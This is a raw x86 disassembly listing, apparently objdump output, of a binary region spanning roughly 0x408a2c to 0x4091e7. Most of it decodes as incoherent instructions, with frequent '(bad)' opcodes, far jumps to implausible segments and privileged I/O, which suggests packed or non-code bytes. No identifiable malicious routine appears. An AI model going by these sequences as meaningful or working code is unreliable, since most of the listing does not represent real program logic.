  408a2c:	repz out dx,al
  408a2e:	cmp    esp,DWORD PTR [ebx+0x78]
  408a31:	scas   al,BYTE PTR es:[edi]
  408a32:	and    eax,0xa5b3d27c
  408a37:	jnp    0x408aa2
  408a39:	jmp    0x860a:0xa10210d0
  408a40:	imul   esp,ebx,0xe
  408a43:	repnz inc edx
  408a45:	sub    ecx,DWORD PTR [ebp-0x51]
  408a48:	ffreep st(2)
  408a4a:	xchg   edx,eax
  408a4b:	jl     0x408a16
  408a4d:	test   eax,0x92f347b0
  408a52:	popa   
  408a53:	dec    ebp
  408a54:	mov    DWORD PTR [eax],esp
  408a56:	rcr    DWORD PTR [edi-0x16e09f55],0x83
  408a5d:	pusha  
  408a5e:	daa    
  408a5f:	shl    ch,1
  408a61:	daa    
  408a62:	jl     0x408adb
  408a64:	push   ds
  408a65:	and    eax,0xffffffaf
  408a68:	cmp    cl,BYTE PTR [esi+esi*8-0x1c9e17d]
  408a6f:	adc    eax,0xd7ca50a2
  408a74:	dec    ebx
  408a75:	js     0x408a5c
  408a77:	ret    
  408a78:	pusha  
  408a79:	adc    DWORD PTR [ebx+0x1b],ebx
  408a7c:	addr16 pop ss
  408a7e:	loop   0x408a1d
  408a80:	sbb    DWORD PTR [edx-0x6a5fd062],ecx
  408a86:	(bad)  
  408a88:	sbb    BYTE PTR [esi-0x7c3c64cc],ah
  408a8e:	stos   BYTE PTR es:[edi],al
  408a8f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  408a91:	js     0x408a4c
  408a93:	(bad)  
  408a94:	lods   eax,DWORD PTR ds:[esi]
  408a95:	inc    edi
  408a96:	fisttp WORD PTR [ecx]
  408a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a99:	aaa    
  408a9a:	sbb    DWORD PTR [ecx+edx*4-0x63d555fc],0xfffffffe
  408aa2:	test   al,0xa2
  408aa4:	mov    edi,0xf03050c
  408aa9:	addr16 mov esi,0x8a069eca
  408aaf:	and    eax,0xe6ede04
  408ab4:	jmp    0xd4f3437f
  408ab9:	pop    esi
  408aba:	ret    
  408abb:	pop    esp
  408abc:	mov    esp,0x6afee7a5
  408ac1:	je     0x408a95
  408ac3:	ret    
  408ac4:	jle    0x408b0f
  408ac6:	mov    ebx,0x184e4e0d
  408acb:	push   cs
  408acc:	lock outs dx,DWORD PTR ds:[esi]
  408ace:	es sub ebp,edi
  408ad1:	neg    DWORD PTR [eax+ecx*2]
  408ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad5:	pop    esi
  408ad6:	fwait
  408ad7:	dec    esp
  408ad8:	dec    esp
  408ad9:	fst    QWORD PTR [ebx]
  408adb:	pop    edx
  408adc:	mov    al,ds:0x634fc1f5
  408ae1:	(bad)  
  408ae2:	cmp    al,0x1a
  408ae4:	jo     0x408ad0
  408ae6:	push   ebx
  408ae7:	(bad)
  408aeb:	stos   DWORD PTR es:[edi],eax
  408aec:	cmp    BYTE PTR [edi+0x7d],0x8
  408af0:	mov    ah,0x91
  408af2:	fild   DWORD PTR [edx+0x317353f1]
  408af8:	hlt    
  408af9:	push   ecx
  408afa:	sub    al,0x3a
  408afc:	loopne 0x408ab5
  408afe:	popa   
  408aff:	dec    esp
  408b00:	or     bl,BYTE PTR [esp+edx*4-0x1e]
  408b04:	sbb    ah,bl
  408b06:	lods   eax,DWORD PTR ds:[esi]
  408b07:	cdq    
  408b08:	mov    edx,0x3319f33c
  408b0d:	push   ebp
  408b0e:	cmp    dh,BYTE PTR [eax-0x1db95ffe]
  408b14:	jge    0x408b7f
  408b16:	jmp    0x9087b2a5
  408b1b:	retf   0xfb34
  408b1e:	je     0x408b62
  408b20:	fucomip st,st(6)
  408b22:	and    eax,DWORD PTR [edi-0x521a1691]
  408b28:	ja     0x408b4c
  408b2a:	mov    al,ds:0x95e4f669
  408b2f:	and    BYTE PTR [eax-0x4a],al
  408b32:	xor    al,0x63
  408b34:	xchg   esp,eax
  408b35:	jge    0x408af2
  408b37:	sub    BYTE PTR [edi],cl
  408b39:	xchg   ebp,eax
  408b3a:	dec    ebp
  408b3b:	cmp    BYTE PTR [edi],ah
  408b3d:	inc    ebx
  408b3e:	js     0x408ae8
  408b40:	mov    cl,0x93
  408b42:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408b44:	jne    0x408b99
  408b46:	xchg   edx,eax
  408b47:	test   BYTE PTR [esi-0x5ec030ed],0x9f
  408b4e:	out    0x37,eax
  408b50:	cdq    
  408b51:	cmp    esi,DWORD PTR [esi-0x7200d5b1]
  408b57:	clc    
  408b58:	push   ss
  408b59:	mov    fs,WORD PTR [eax+0x4cf69f7c]
  408b5f:	test   DWORD PTR [edx-0x17],esi
  408b62:	dec    ebp
  408b63:	(bad)
  408b66:	push   eax
  408b67:	or     ah,BYTE PTR [edx]
  408b69:	fcom   QWORD PTR [esi+esi*2-0x3d3cc6cb]
  408b70:	sahf   
  408b71:	mov    al,ds:0xce6bd4c9
  408b76:	hlt    
  408b77:	jbe    0x408b94
  408b79:	faddp  st(4),st
  408b7b:	pop    eax
  408b7c:	jne    0x408b07
  408b7e:	mov    ecx,0xff029084
  408b83:	mov    ecx,0x30790f64
  408b88:	pop    esp
  408b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b8a:	popf   
  408b8b:	js     0x408bb5
  408b8d:	jno    0x408b68
  408b8f:	and    ebx,ebx
  408b91:	fist   WORD PTR [eax]
  408b93:	xchg   DWORD PTR [esi-0x455aee6c],edi
  408b99:	sbb    BYTE PTR [edx+0x53a863],ah
  408b9f:	mov    BYTE PTR [eax-0x7ecac53c],bl
  408ba5:	inc    edi
  408ba6:	dec    ebp
  408ba7:	push   ecx
  408ba8:	mov    eax,ds:0xcba5b799
  408bad:	pop    edi
  408bae:	jmp    0x408bc7
  408bb0:	out    dx,eax
  408bb1:	fldenv [esi+esi*1-0x7]
  408bb5:	bound  eax,QWORD PTR [edx+0x7de0f827]
  408bbb:	int3   
  408bbc:	les    ecx,FWORD PTR [esi-0x1c]
  408bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bc0:	dec    edx
  408bc1:	add    eax,0xe077f081
  408bc6:	loope  0x408bcb
  408bc8:	xlat   BYTE PTR ds:[ebx]
  408bc9:	adc    eax,0x6e10f3fd
  408bce:	push   cs
  408bcf:	push   eax
  408bd0:	xchg   ebx,eax
  408bd1:	rcr    DWORD PTR [edx-0xe],cl
  408bd4:	and    BYTE PTR [esi-0x25f02f54],dl
  408bda:	or     eax,0x66c4843d
  408bdf:	add    eax,0xf7f648b4
  408be4:	cli    
  408be5:	cdq    
  408be6:	push   esp
  408be7:	pop    bp
  408be9:	cmp    edx,DWORD PTR [edi+ebp*2+0x44]
  408bed:	xor    al,0xf1
  408bef:	fadd   DWORD PTR [esi]
  408bf1:	dec    ebp
  408bf2:	or     ch,BYTE PTR [ebp+0x6c47c809]
  408bf8:	not    DWORD PTR [ecx+0x646c978c]
  408bfe:	mov    esp,0x223e3969
  408c03:	jp     0x408b88
  408c05:	addr16 sbb eax,0x9261b39e
  408c0b:	or     BYTE PTR [ebp+0x19],ah
  408c0e:	pushf  
  408c0f:	pop    edx
  408c10:	(bad)  
  408c11:	xchg   esi,eax
  408c12:	fstp   DWORD PTR [ecx-0x7e80298a]
  408c18:	jle    0x408bb3
  408c1a:	mov    edi,fs
  408c1c:	(bad)  
  408c1d:	xchg   edi,eax
  408c1e:	or     al,0x98
  408c20:	fcomp  DWORD PTR [ecx+0x48195541]
  408c26:	add    DWORD PTR ds:0x7883406,esp
  408c2c:	in     al,dx
  408c2d:	test   al,0x6d
  408c2f:	adc    al,0xea
  408c31:	mov    edi,DWORD PTR [edi]
  408c33:	or     DWORD PTR [esi],edx
  408c35:	hlt    
  408c36:	push   ss
  408c37:	hlt    
  408c38:	jmp    0x570dd5c8
  408c3d:	jnp    0x408bef
  408c3f:	inc    esi
  408c40:	add    eax,0x5e0b0f78
  408c45:	cmp    BYTE PTR [esi-0x2e78b6a7],0xfe
  408c4c:	or     bh,bh
  408c4e:	jne    0x408c40
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	(bad)  
  408c71:	mov    dl,0x38
  408c73:	je     0x408cbc
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408cbd
  408c7d:	sbb    DWORD PTR [edx-0x4abef749],edx
  408c83:	loope  0x408c42
  408c85:	xchg   ebp,eax
  408c86:	mov    bl,0x62
  408c88:	adc    BYTE PTR [eax-0x30],dl
  408c8b:	cld    
  408c8c:	scas   eax,DWORD PTR es:[edi]
  408c8d:	or     BYTE PTR [eax],dh
  408c8f:	shl    esp,0xe9
  408c92:	mov    BYTE PTR [eax],0x97
  408c95:	sbb    BYTE PTR [ebp+0x79],ch
  408c98:	xor    BYTE PTR [edi+0x19],0x76
  408c9c:	ret    0x6103
  408c9f:	dec    edi
  408ca0:	inc    ebp
  408ca1:	es dec edi
  408ca3:	ss jmp 0xc26e:0x739e7aa0
  408cab:	ret    0xf170
  408cae:	jmp    0x1a36e333
  408cb3:	mov    eax,0x499809fc
  408cb8:	cmc    
  408cb9:	scas   eax,DWORD PTR es:[edi]
  408cba:	add    BYTE PTR [ebx+edx*2+0x707652ee],ch
  408cc1:	test   eax,0xe3e9c019
  408cc6:	push   edx
  408cc7:	lods   eax,DWORD PTR ds:[esi]
  408cc8:	imul   esp,DWORD PTR [eax+0x14],0xeed280b3
  408ccf:	jae    0x408d3b
  408cd1:	sti    
  408cd2:	mov    esi,DWORD PTR [ebp-0x31]
  408cd5:	lahf   
  408cd6:	push   cs
  408cd7:	(bad)  
  408cd8:	ficom  DWORD PTR ds:0x37c6d25e
  408cde:	out    0x2a,al
  408ce0:	fsubr  DWORD PTR [edi+0x13]
  408ce3:	scas   al,BYTE PTR es:[di]
  408ce5:	mov    al,0x2b
  408ce8:	out    dx,eax
  408ce9:	pop    es
  408cea:	imul   ecx,DWORD PTR [edx],0x5965eeb9
  408cf0:	xchg   ecx,eax
  408cf1:	sub    eax,0xb33277c7
  408cf6:	push   eax
  408cf7:	jb     0x408ccd
  408cf9:	outs   dx,DWORD PTR ds:[esi]
  408cfa:	push   ds
  408cfb:	aaa    
  408cfc:	mov    al,0xd5
  408cfe:	shl    esp,0x59
  408d01:	mov    edx,0x66a0e1f
  408d06:	sbb    al,0xe4
  408d08:	sub    bh,BYTE PTR [esi-0x6585e3f7]
  408d0e:	adc    BYTE PTR [ecx+eax*2-0x534defa2],ah
  408d15:	mov    ah,0x80
  408d17:	cmp    dh,BYTE PTR ds:0x1c754902
  408d1d:	sbb    al,0x4
  408d20:	jl     0x408d2c
  408d22:	inc    eax
  408d23:	jecxz  0x408d45
  408d25:	and    DWORD PTR [edx],0x69
  408d28:	adc    DWORD PTR [esi],0xfffffff5
  408d2b:	push   eax
  408d2c:	mov    ds:0x23875438,eax
  408d31:	cwde   
  408d32:	xchg   esp,eax
  408d33:	shr    DWORD PTR [ecx+0x68],1
  408d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d37:	xchg   BYTE PTR ds:0xf8ea4cf7,ch
  408d3d:	xor    BYTE PTR [ebx+0x47113fff],cl
  408d43:	mov    ch,BYTE PTR [eax]
  408d45:	mov    eax,ds:0xa3aa28ed
  408d4a:	int3   
  408d4b:	add    cl,dh
  408d4d:	mov    ebx,0x37dae0f5
  408d52:	add    dh,dh
  408d54:	outs   dx,DWORD PTR ds:[esi]
  408d55:	ins    DWORD PTR es:[edi],dx
  408d56:	fwait
  408d57:	(bad)  
  408d58:	jno    0x408d03
  408d5a:	xlat   BYTE PTR ds:[ebx]
  408d5b:	xchg   edi,eax
  408d5c:	push   edi
  408d5d:	gs add al,0x81
  408d60:	push   es
  408d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d62:	shl    DWORD PTR [edx],1
  408d64:	push   eax
  408d65:	call   dx
  408d68:	rol    DWORD PTR [eax-0x17c5616e],1
  408d6e:	jmp    0x58c45ed5
  408d73:	pop    ebp
  408d74:	scas   eax,DWORD PTR es:[edi]
  408d75:	pop    edi
  408d76:	dec    ebx
  408d77:	xor    al,0x82
  408d79:	fsubrp st(4),st
  408d7b:	pop    ss
  408d7c:	push   ds
  408d7d:	ss jl  0x408d36
  408d80:	fidivr DWORD PTR [ebp-0x2bf61946]
  408d86:	ja     0x408d27
  408d88:	push   cs
  408d89:	mov    edi,0x920c9cdd
  408d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d8f:	shl    ch,cl
  408d91:	pushf  
  408d92:	cmp    DWORD PTR [ebx-0x3],0x391a4af7
  408d99:	imul   edi,DWORD PTR [ebx],0xdc26caff
  408d9f:	aaa    
  408da0:	sar    bh,cl
  408da2:	mov    dh,0x64
  408da4:	in     eax,dx
  408da5:	inc    eax
  408da6:	mov    esp,DWORD PTR ds:0x948cf118
  408dac:	pop    edx
  408dad:	push   cs
  408dae:	add    DWORD PTR [edi+0x4f],esp
  408db1:	and    al,BYTE PTR [ebp+0x40e78cc2]
  408db7:	ins    BYTE PTR es:[edi],dx
  408db8:	dec    edi
  408db9:	push   esi
  408dba:	(bad)  
  408dbb:	mov    ds:0x6eb18658,eax
  408dc0:	lods   eax,DWORD PTR ds:[esi]
  408dc1:	or     al,0x8a
  408dc3:	adc    eax,0x6aa56674
  408dc8:	bound  edx,QWORD PTR [ebp-0x4cb3d701]
  408dce:	push   ebp
  408dcf:	mov    ecx,0xfd97f20
  408dd4:	xchg   esi,eax
  408dd5:	popa   
  408dd6:	mov    al,ds:0xf90d9271
  408ddb:	les    esp,FWORD PTR ds:0xe33083d5
  408de1:	enter  0xf791,0x37
  408de5:	xchg   edx,eax
  408de6:	lock nop
  408de8:	xor    al,0x82
  408dea:	mov    DWORD PTR [esi],edi
  408dec:	jg     0x408e48
  408dee:	push   ss
  408def:	dec    eax
  408df0:	pop    ss
  408df1:	mov    ebp,0x570d0858
  408df6:	ja     0x408e16
  408df8:	icebp  
  408df9:	and    al,0xb
  408dfb:	pusha  
  408dfc:	jmp    0x3417a4c2
  408e01:	sub    BYTE PTR [edx],bl
  408e03:	xor    eax,0xdfab2e55
  408e08:	push   esp
  408e09:	bound  ebp,QWORD PTR [edx+0x58]
  408e0c:	xor    bl,dh
  408e0e:	ret    
  408e0f:	add    eax,0x3647c52a
  408e14:	popf   
  408e15:	(bad)  
  408e16:	int3   
  408e17:	pop    ebp
  408e18:	inc    ebp
  408e19:	xchg   bl,cl
  408e1b:	aaa    
  408e1c:	xchg   esi,eax
  408e1d:	das    
  408e1e:	mul    ebp
  408e20:	pop    esi
  408e21:	jne    0x408e46
  408e23:	adc    DWORD PTR [edx+0x12],edi
  408e26:	lods   eax,DWORD PTR ds:[esi]
  408e27:	mov    cl,0x8b
  408e29:	nop    DWORD PTR [ebx+eiz*2+0xe68ae94]
  408e31:	loope  0x408e23
  408e33:	(bad)  
  408e35:	lods   eax,DWORD PTR ds:[esi]
  408e36:	les    edi,FWORD PTR [esi]
  408e38:	add    edi,DWORD PTR [ecx]
  408e3a:	fsubr  st,st(0)
  408e3c:	fdivr  st(0),st
  408e3e:	and    BYTE PTR [edx+0x3f],bl
  408e41:	mov    al,0xa7
  408e43:	pop    ebx
  408e44:	pop    esp
  408e45:	sub    ah,cl
  408e47:	bound  esi,QWORD PTR [esi]
  408e49:	lock jmp 0x408ec2
  408e4c:	div    BYTE PTR [ebx+eax*4+0x66]
  408e50:	rol    BYTE PTR [edx],cl
  408e52:	mov    eax,0x904a2c9b
  408e57:	xchg   dh,al
  408e59:	inc    esi
  408e5a:	dec    ecx
  408e5b:	jge    0x408e91
  408e5d:	sbb    al,0x22
  408e5f:	test   BYTE PTR [ecx+0x1c],ch
  408e62:	es (bad) 
  408e64:	jmp    0xc4b9b4e3
  408e69:	mov    edi,0xfe66460a
  408e6e:	mov    edi,0xf83a9ad4
  408e73:	aad    0xb1
  408e75:	lods   al,BYTE PTR ds:[esi]
  408e76:	dec    edi
  408e77:	outs   dx,BYTE PTR ds:[esi]
  408e78:	dec    ebx
  408e79:	push   cs
  408e7a:	push   ds
  408e7b:	or     eax,0x137c1509
  408e80:	mov    al,ds:0xd340a82d
  408e85:	or     esp,ebx
  408e87:	adc    DWORD PTR [edx+0x1d],edx
  408e8a:	mov    esi,0x3e4b21fa
  408e8f:	scas   eax,DWORD PTR es:[edi]
  408e90:	adc    al,BYTE PTR ds:0x637e0177
  408e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e97:	pop    esp
  408e98:	inc    eax
  408e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9a:	mov    eax,ds:0x42f341d
  408e9f:	pcmpgtd mm3,QWORD PTR [ecx+0x6a]
  408ea3:	int    0x61
  408ea5:	xor    bl,BYTE PTR [edx+esi*1]
  408ea8:	inc    eax
  408ea9:	retf   0x3a5a
  408eac:	jl     0x408f24
  408eae:	popa   
  408eaf:	push   edi
  408eb0:	stc    
  408eb1:	sub    ecx,DWORD PTR [ecx-0xf8c1d1a]
  408eb7:	shr    bh,1
  408eb9:	mov    eax,ds:0xfc643eb7
  408ebe:	or     DWORD PTR [edi-0xebf2039],esp
  408ec4:	gs test al,0x26
  408ec7:	fmul   QWORD PTR [edi]
  408ec9:	push   ebp
  408eca:	mov    edx,0xadf1442c
  408ecf:	sub    al,0xcd
  408ed1:	test   eax,0x3b2cee69
  408ed6:	xor    eax,0xbceab4f0
  408edb:	mov    edx,0x93571890
  408ee0:	loopne 0x408ecd
  408ee2:	push   esp
  408ee3:	in     eax,dx
  408ee4:	dec    esp
  408ee5:	dec    ebx
  408ee6:	push   eax
  408ee7:	mov    esi,0xacd3b823
  408eec:	mov    edi,edi
  408eee:	lods   al,BYTE PTR ds:[esi]
  408eef:	adc    DWORD PTR [ecx+0x11],eax
  408ef2:	fsubrp st(3),st
  408ef4:	fcomp  QWORD PTR [esi-0x6eb7a446]
  408efa:	jecxz  0x408f1d
  408efc:	imul   eax,ebx,0x93d70460
  408f02:	xor    al,0xa5
  408f04:	pushf  
  408f05:	call   0x3760:0x45d103ec
  408f0c:	test   BYTE PTR [ecx-0x26],dh
  408f0f:	mov    eax,0xbebf68d0
  408f14:	pop    edi
  408f15:	in     eax,dx
  408f16:	pop    ecx
  408f17:	push   0xffffff91
  408f19:	das    
  408f1a:	(bad)  
  408f1b:	js     0x408f5c
  408f1d:	mov    ecx,0x300934c3
  408f22:	pop    ecx
  408f23:	aam    0xfe
  408f25:	pop    edi
  408f26:	jae    0x408ef3
  408f28:	out    0x26,eax
  408f2a:	popa   
  408f2b:	ins    DWORD PTR es:[edi],dx
  408f2c:	repz cmc 
  408f2e:	daa    
  408f2f:	pop    edx
  408f30:	fiadd  DWORD PTR [ebp-0x3b371c11]
  408f36:	mov    ebx,0x390b3e2a
  408f3b:	int    0x94
  408f3d:	inc    ebp
  408f3e:	jnp    0x408ecb
  408f40:	mul    BYTE PTR [ecx+0x3e40ed53]
  408f46:	lods   al,BYTE PTR gs:[esi]
  408f48:	dec    esp
  408f49:	jmp    0x4b5a:0xf6695e45
  408f50:	stos   BYTE PTR es:[edi],al
  408f51:	js     0x408f0f
  408f53:	mov    edx,0xc7960eb2
  408f58:	inc    ebp
  408f59:	dec    ecx
  408f5a:	sbb    ah,ah
  408f5c:	icebp  
  408f5d:	jl     0x408fce
  408f5f:	rcr    edx,1
  408f61:	outs   dx,DWORD PTR ds:[esi]
  408f62:	sub    al,0x5f
  408f64:	push   ecx
  408f65:	xchg   esi,eax
  408f66:	or     bl,BYTE PTR [eax]
  408f68:	push   esi
  408f69:	and    edx,edx
  408f6b:	int3   
  408f6c:	sub    edi,ebx
  408f6e:	mov    bl,0x1e
  408f70:	int    0x24
  408f72:	inc    esi
  408f73:	fistp  DWORD PTR [ebx-0x544cf982]
  408f79:	cmp    eax,0x7babc2f5
  408f7e:	adc    BYTE PTR [esi+0x3c],0x13
  408f82:	fcomp  QWORD PTR [ecx-0x37c04386]
  408f88:	fcomp  st(2)
  408f8a:	inc    ecx
  408f8b:	pop    edx
  408f8c:	ret    0xc2d4
  408f8f:	repz pop sp
  408f92:	stos   BYTE PTR es:[edi],al
  408f93:	shl    BYTE PTR [edx],cl
  408f95:	xor    bh,bh
  408f97:	out    dx,eax
  408f98:	sbb    ecx,DWORD PTR [esi-0x41e97a57]
  408f9e:	jmp    0x89c:0xd8e6b01d
  408fa5:	lods   al,BYTE PTR ds:[esi]
  408fa6:	sub    al,0xaf
  408fa8:	cli    
  408fa9:	nop
  408faa:	and    al,0x64
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xfb1937f3
  408fc6:	repz daa 
  408fc8:	out    0x77,eax
  408fca:	out    0x70,al
  408fcc:	jo     0x408fee
  408fce:	jge    0x409040
  408fd0:	jo     0x408fa7
  408fd2:	test   al,0x4c
  408fd4:	jge    0x409037
  408fd6:	sbb    eax,DWORD PTR [ebx]
  408fd8:	push   ds
  408fd9:	out    dx,eax
  408fda:	cs movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  408fdd:	arpl   WORD PTR [ecx-0x7fac8406],sp
  408fe3:	add    eax,0x2c8a24db
  408fe8:	inc    edx
  408fe9:	lods   eax,DWORD PTR ds:[esi]
  408fea:	jmp    0x96f07fec
  408fef:	dec    esi
  408ff0:	loopne 0x409047
  408ff2:	jge    0x408f9f
  408ff4:	pop    ecx
  408ff5:	out    dx,al
  408ff6:	fld    TBYTE PTR [ebx]
  408ff8:	stos   DWORD PTR es:[edi],eax
  408ff9:	cmp    al,0x28
  408ffb:	jmp    0x3ee7ea62
  409000:	imul   BYTE PTR [ebx*2+0x8f2296b]
  409007:	mov    bh,0x61
  409009:	inc    eax
  40900a:	adc    BYTE PTR [edx+0xa],0x98
  40900e:	push   ds
  40900f:	or     DWORD PTR [eax+edx*4],ebx
  409012:	xor    dl,dl
  409014:	jg     0x408fcc
  409016:	xor    eax,DWORD PTR ds:[ebx-0x7c337f15]
  40901d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40901e:	iret   
  40901f:	jne    0x408fc9
  409021:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409023:	push   cs
  409024:	add    cl,BYTE PTR [edi+0x471b8d96]
  40902a:	rcr    DWORD PTR [ebx+0x1a],1
  40902d:	jp     0x408fb5
  40902f:	pop    eax
  409030:	pop    esp
  409031:	leave  
  409032:	xor    eax,0xd1c63bec
  409037:	mov    ds:0xafe822ca,eax
  40903c:	jmp    0xac65904
  409041:	sbb    ebx,DWORD PTR [eax]
  409043:	pushf  
  409044:	push   fs
  409046:	jmp    0x77e883d0
  40904b:	push   0xc080423a
  409050:	add    DWORD PTR [ebp+0x146f6b43],ebp
  409056:	sbb    bl,BYTE PTR [eax-0x15078b3a]
  40905c:	(bad)  
  40905e:	cwde   
  40905f:	push   ss
  409060:	cli    
  409061:	(bad)  
  409062:	(bad)  
  409063:	push   eax
  409064:	lahf   
  409065:	mov    ch,0x1c
  409067:	or     ecx,eax
  409069:	inc    ecx
  40906a:	nop
  40906b:	pop    edi
  40906c:	ret    0x8c7a
  40906f:	xchg   esp,eax
  409070:	cmp    esi,esp
  409072:	lods   al,BYTE PTR ds:[esi]
  409073:	(bad)  
  409074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409075:	stos   DWORD PTR es:[edi],eax
  409076:	sbb    edi,DWORD PTR [edx+0x52]
  409079:	sbb    bl,bl
  40907b:	sbb    ch,cl
  40907d:	push   es
  40907e:	jg     0x40900e
  409080:	pop    esp
  409081:	pop    esp
  409082:	xor    DWORD PTR [ecx+0x2a],edi
  409085:	pop    ebx
  409086:	sub    dl,cl
  409088:	mov    dl,0x81
  40908a:	test   BYTE PTR [ecx+0x65],cl
  40908d:	mov    al,0xe6
  40908f:	mov    dh,0xca
  409091:	cli    
  409092:	xchg   ecx,eax
  409093:	(bad)  
  409094:	aad    0xf6
  409096:	lock lods al,BYTE PTR ds:[esi]
  409098:	adc    al,0x57
  40909a:	fld    st(3)
  40909c:	aad    0xcd
  40909e:	xchg   esp,eax
  40909f:	push   eax
  4090a0:	lds    ecx,FWORD PTR [edi]
  4090a2:	retf   0xb3f5
  4090a5:	sbb    al,0x2c
  4090a7:	aas    
  4090a8:	inc    ebx
  4090a9:	cwde   
  4090aa:	call   0x484fb97
  4090af:	dec    ecx
  4090b0:	ret    
  4090b1:	fisub  WORD PTR [ebx]
  4090b3:	xchg   esi,edx
  4090b5:	sub    al,0x7
  4090b7:	push   ss
  4090b8:	test   al,0x57
  4090ba:	jp     0x40909e
  4090bc:	lock mov esp,ebp
  4090bf:	ja     0x40906b
  4090c1:	jg     0x40909f
  4090c3:	jo     0x409105
  4090c5:	jae    0x40906c
  4090c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090c8:	xor    eax,0x4079ef4b
  4090cd:	sub    bl,BYTE PTR ds:0xb04990bb
  4090d3:	pop    esp
  4090d4:	rol    DWORD PTR [edx],cl
  4090d6:	fs xor al,0x98
  4090d9:	xchg   ebx,eax
  4090da:	nop
  4090db:	nop
  4090dc:	and    al,0xd8
  4090de:	sub    eax,0x46a61ad9
  4090e3:	popa   
  4090e4:	push   esp
  4090e5:	out    0xd6,al
  4090e7:	dec    edi
  4090e8:	test   bh,bh
  4090ea:	cmp    DWORD PTR [ebx-0x70],esp
  4090ed:	mov    ebp,0xf27db809
  4090f2:	mov    WORD PTR [ebp+0x79],?
  4090f5:	retf   
  4090f6:	mov    edi,0x73e6917a
  4090fb:	push   edi
  4090fc:	loop   0x40916e
  4090fe:	in     al,0x34
  409100:	xchg   edi,eax
  409101:	jge    0x4090eb
  409103:	ins    BYTE PTR es:[edi],dx
  409104:	jle    0x4090f7
  409106:	je     0x4090b3
  409108:	lods   eax,DWORD PTR ds:[esi]
  409109:	aad    0xcd
  40910b:	adc    al,0x8f
  40910d:	and    DWORD PTR [edi],edi
  40910f:	jecxz  0x409137
  409111:	add    BYTE PTR [edi+ecx*1+0x5b0212ec],al
  409118:	into   
  409119:	not    eax
  40911b:	repz xchg esi,eax
  40911d:	lock scas eax,DWORD PTR es:[edi]
  40911f:	test   DWORD PTR [eax],ebp
  409121:	xor    al,0xc5
  409123:	push   eax
  409124:	and    DWORD PTR [edi],esi
  409126:	xor    DWORD PTR [esi-0x20],0xffffff8f
  40912a:	cs aas 
  40912c:	mov    edx,0x49d4b89a
  409131:	sub    al,0x5c
  409133:	iret   
  409134:	leave  
  409135:	inc    edi
  409136:	ds and al,0x41
  409139:	mov    fs,WORD PTR [esp+edx*4+0x20]
  40913d:	(bad)  
  40913e:	and    edi,DWORD PTR [esi]
  409140:	outs   dx,DWORD PTR ds:[esi]
  409141:	jmp    0xb304:0x87de850f
  409148:	fisttp DWORD PTR [edi-0x6c1a502f]
  40914e:	cmp    DWORD PTR [ebx],edx
  409150:	lds    edi,FWORD PTR [ecx+eax*1-0x40]
  409154:	pop    esi
  409155:	and    dh,dl
  409157:	mov    eax,0xe4ee9ef6
  40915c:	cmp    eax,0xbf155987
  409161:	dec    esi
  409162:	ja     0x4090e7
  409164:	push   eax
  409165:	(bad)  
  409167:	in     al,dx
  409168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409169:	lock lds edx,FWORD PTR cs:[esi]
  40916d:	sbb    al,0xbb
  40916f:	jmp    0x40915b
  409171:	pop    esp
  409172:	sbb    al,ah
  409174:	adc    BYTE PTR ds:0xffd797c1,ah
  40917a:	add    al,0x79
  40917c:	call   0x956b:0xf30edbfb
  409183:	stc    
  409184:	stc    
  409185:	jo     0x4091c2
  409187:	mov    ds:0xcc315968,al
  40918c:	mov    ah,0xb1
  40918e:	inc    ebp
  40918f:	or     DWORD PTR [ebp+0x3b],ebx
  409192:	out    dx,eax
  409193:	bound  edi,QWORD PTR [ecx+eax*2+0x47]
  409197:	push   ebx
  409198:	pop    edx
  409199:	clc    
  40919a:	mov    al,0x97
  40919c:	(bad)  
  40919d:	jp     0x409217
  40919f:	fdiv   DWORD PTR [esp+ecx*1+0x66]
  4091a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091a4:	inc    BYTE PTR [ebx]
  4091a6:	rcr    BYTE PTR [ecx-0x78],0x16
  4091aa:	mov    ebx,0x3042e0b3
  4091af:	fld    DWORD PTR [edi-0x3f]
  4091b2:	rcr    BYTE PTR [esi+0x2ee5b383],0x50
  4091b9:	loopne 0x4091ed
  4091bb:	jnp    0x4091b9
  4091bd:	ret    0x6df3
  4091c0:	retf   0x314
  4091c3:	mov    ebp,0x5e9d33f8
  4091c8:	not    dl
  4091ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091cb:	sub    ah,BYTE PTR [edx]
  4091cd:	cmp    DWORD PTR [esi],edi
  4091cf:	cmp    BYTE PTR [eax+0x4],dl
  4091d2:	test   bl,0xac
  4091d5:	xor    al,0x9e
  4091d7:	xchg   edx,eax
  4091d8:	and    eax,ebp
  4091da:	mov    WORD PTR [ebp+0x5c],bx
  4091de:	test   al,dl
  4091e0:	jmp    0x39c1:0xe1608436
  4091e7:	or     al,0xc
